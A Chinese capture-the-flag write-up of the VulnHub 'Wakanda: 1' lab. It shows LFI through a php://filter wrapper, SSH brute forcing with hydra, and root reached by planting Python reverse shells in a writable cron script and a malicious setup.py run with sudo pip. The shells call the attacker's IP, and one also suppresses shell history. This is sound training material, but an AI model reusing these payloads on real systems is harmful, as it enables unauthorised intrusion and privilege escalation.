---
title: Wakanda-1
author: Creexile
date: 2024-12-19 18:41:53
lastMod: 2025-04-10
summary: 'No.14'
cover: ''
category: '靶场'
draft: false
comments: false
sticky: 0
tags: [文件包含, 伪协议, 提权, 渗透]
---

# Wakanda: 1

---

No.15

> 来源: [vulnhub靶场-Wakanda: 1](https://www.vulnhub.com/entry/wakanda-1,251/)
>
> 目标: Flags: There are three flags (flag1.txt, flag2.txt, root.txt)
>
> 提示: Follow your intuitions ... and enumerate!
>
> 妙妙工具: `python -c 'import pty; pty.spawn("/bin/bash")'`

## 环境配置

- kali: 192.168.56.5
- target: 192.168.56.101

## 信息收集

nmap扫描得到靶机ip和对应信息

```bash
nmap -sS 192.168.56.0/24

80/tcp http
111/tcp rpcbind
3333/tcp dec-notes
```

> 其实测试后发现3333是ssh端口, 可以利用ssh链接

http下手, 首先是网站下方有一个`Made by@mamadou`的描述, 可能是用户名

然后是查看源码, 给了如下提示:

```html
<!-- <a class="nav-link active" href="?lang=fr">Fr/a> -->
```

尝试给网站传参`?lang=fr`, 发现变成了法语网站, 那么这就是一个传参点, 等下看看有什么利用方法

目录扫描, 扫出来的访问都为空;

实在是没有其他的地方可以用了, 看看这个传参点能不能用

在测试了几类后, 猜测可能是文件包含; 因为当我访问`192.168.56.101/fr.php`的时候, 返回的并不是Not Found而是空白界面, 说明存在一个`fr.php`文件, 且传入`?lang=fr`的时候被首页包含了

所以我们尝试伪协议读取文件, 注意包含时自带后缀:

```
/?lang=php://filter/convert.base64-encode/resource=index
```

![image.png](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241218222336.png)

如果你觉得还要解码比较麻烦, 就试试这个, 可以直接拿到源码

```bash
curl http://192.168.247.152/?lang=php://filter/convert.base64-encode/resource=index | head -n 1 | base64 -d
```

现在我们拿到了密码`Niamey4Ever227!!!`, 不知道用户名, 比较简单的方法就是全部爬下来然后爆破

```bash
cewl 192.168.56.101 -w 1.txt
hydra -L 1.txt -p 'Niamey4Ever227!!!' ssh://192.168.56.101:3333
```

![image.png](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241218223543.png)

得到账号密码: `mamadou : Niamey4Ever227!!!`

## getshell

ssh登录靶机, 登录后发现是python终端; 这时候使用我们的妙妙工具

```bash
ssh mamadou@192.168.56.101 -p 3333
# Niamey4Ever227!!!
import pty; pty.spawn("/bin/bash")
```

![image.png](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241218223845.png)

## 信息收集

```bash
# 系统信息 Linux Wakanda1 3.16.0-6-amd64 #1 SMP Debian 3.16.57-2 (2018-07-14) x86_64 GNU/Linux
uname -a
# 内核版本 3.16.0-6-amd64
uname -r
# Debian GNU/Linux 8.11 (jessie)
lsb_release -a
# 查看环境
gcc -v
```

没什么好说的, 看看怎么提权

首先在kali搜索, 发现没有什么可以用的, 那还是老老实实找flag吧

```
searchsploit Debian 8
```

看看有没有其他用户(大于1000的就是用户):

```bash
cat /etc/passwd
# devops
```

看看有没有什么特权文件:

```bash
# 查看特权文件, 没啥东西
find / -perm -4000 2>/dev/null
# mamadou用户可以访问的东西
find / -user mamadou 2>&1 | grep -v "Permission denied\|proc"
```

![image.png](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241218225926.png)

> 那些44302的是我测试用的, 真没用别试了

flag1抓出来看看: `Flag : d86b9ad71ca887f4dd1dac86ba1c4dfc`

看看自己的`sudo -l`, 也没啥东西; 那就看看别的用户:

```bash
# devops用户可以访问的东西
find / -user devops 2>&1 | grep -v "Permission denied\|proc"
```

![image.png](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241218230526.png)

看看flag2, 发现Permission denied, 切换用户肯定无法直接su, 看看有没有别的文件

```
/srv/.antivirus.py
/tmp/test
```

查看`/srv/.antivirus.py`, 发现是一个写test文件进/tmp目录的py程序, 去看看这个test

![image.png](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241218231258.png)

发现这个文件的归属是devops, 而且时间也比较新, 不像是一直在这里的, 似乎是刚才生成的; 那可能就是有个文件一直在运行`/srv/.antivirus.py`

找找文件:

```bash
# 找关于antivirus的有关的有权限执行的文件
find / -name *antivirus* 2>/dev/null | grep -v "permission denied\|proc"
# /srv/.antivirus.py
# /lib/systemd/system/antivirus.service
# /etc/systemd/system/multi-user.target.wants/antivirus.service
cat /lib/systemd/system/antivirus.service
```

![image.png](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241218231535.png)

每300s运行一次`/srv/.antivirus.py`, 我们对这个文件有写的权限, 那直接利用它进行反弹shell; 在文件后面

```bash
nano /srv/.antivirus.py
```

```python
#!/usr/bin/python
# .antivirus.py
import socket,subprocess,os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect(("192.168.56.5", 5555))

os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p = subprocess.call(["/bin/bash", "-i"])
```

等5min, 或者直接改那个文件, 让我们成功拿到devops的权限

![image.png](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241218232755.png)

抓flag2的内容: `Flag 2 : d8ce56398c88e1b4d9e5f83e64c79098`

看看`sudo -l`, 发现可以无需密码sudo执行`/usr/bin/pip`

> 在有些linux机器中, 某个用户拥有pip的sudo权限, 可以利用pip install进行本地提权;
>
> 在执行pip install时会调用`setup.py`，可以在创建**恶意setup.py**文件来达到任意命令执行

故技重施:

```python
#!/usr/bin/python
# setup.py
import socket,subprocess,os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect(("192.168.56.5", 7777))

os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p = subprocess.call(["/bin/bash", "-i"])
```

上传让靶机下载:

```bash
# kali
python3 -m http.server 10000

# target
wget http://192.168.56.5:10000/setup.py
chmod +x setup.py
sudo /usr/bin/pip install . --upgrade --force-reinstall
```

> 这个命令用于用root权限安装或重新安装本地开发的Python包

![image.png](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241218233828.png)

现在去`/root`拿到最后一个flag

![image.png](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241218233942.png)

## 附录

```python
#!/usr/bin/python
def con():
	import socket, time,pty, os
	host='192.168.247.129'
	port=9999

	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.settimeout(10)
	s.connect((host,port))

	os.dup2(s.fileno(),0)
	os.dup2(s.fileno(),1)
	os.dup2(s.fileno(),2)
	os.putenv("HISTFILE",'/dev/null')
	pty.spawn("/bin/bash")
	s.close()
con()

```
